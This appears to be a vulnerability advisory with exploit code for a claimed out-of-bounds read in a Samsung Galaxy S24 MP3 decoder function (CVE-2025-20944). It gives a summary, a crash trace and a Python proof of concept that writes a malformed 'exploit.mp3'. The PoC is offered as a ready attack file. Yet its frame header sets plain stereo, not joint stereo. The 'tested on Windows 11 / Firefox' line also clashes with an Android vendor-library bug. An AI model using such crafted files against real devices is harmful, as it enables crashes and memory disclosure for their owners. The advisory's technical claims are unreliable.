@@ -1,0 +1,59 @@
+=============================================================================================================================================
+| # Title     : Samsung MP3 Decoder (smp123d_joint_stereo_v1) Out-of-Bounds Read Enabling Potential ASLR Bypass                             |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://www.samsung.com/us/                                                                                                 |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/202843/ 
+
+[+] Summary : An out‑of‑bounds read vulnerability exists in the Samsung MP3 decoder, specifically in the function smp123d_joint_stereo_v1. 
+              The decoder fails to validate table indices during joint‑stereo processing, allowing memory outside the intended buffer to be read. This flaw can cause crashes, 
+              inconsistent audio output, and memory disclosure behavior dependent on the process layout. As a result, the bug may enable partial ASLR bypass when a crafted MP3 file is processed on affected Samsung devices. 
+              The issue affects the Samsung Galaxy S24 (patch level December 1, 2024) and is tracked as CVE‑2025‑20944.
+			  
+#00 pc 0000000000035a1c  /vendor/lib64/libsavsac.so 
+    (smp123d_joint_stereo_v1+1436)
+    (BuildId: df93c19e458701b5125d755553f19288)
+
+
+[+] There is no public version number for smp123d_joint_stereo_v1 because:
+
+It is not a standalone library.
+
+It is an internal function inside Samsung’s proprietary MP3 decoder.
+
+Samsung does not publish version numbers for these internal codec modules.
+
+[+] Therefore:
+
+ The vulnerable version is the MP3 decoder shipped with the Samsung Galaxy S24 series (One UI 6.x / Android 14–15).
+Vulnerable Component:
+
+Samsung MP3 Decoder — internal function: smp123d_joint_stereo_v1
+
+Affected Version:
+
+ The decoder included in One UI 6.x (2024 firmware) on the S24 family.
+
+[+]  POC : python poc.py
+
+import struct
+
+def create_malformed_mp3():
+
+    header = b'\xFF\xFB\x90\x00'  
+
+    malicious_data = b''
+
+    for i in range(1000):
+        malicious_data += struct.pack('>H', 0xFFFF) 
+    
+    return header + malicious_data
+
+with open('exploit.mp3', 'wb') as f:
+    f.write(create_malformed_mp3())
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
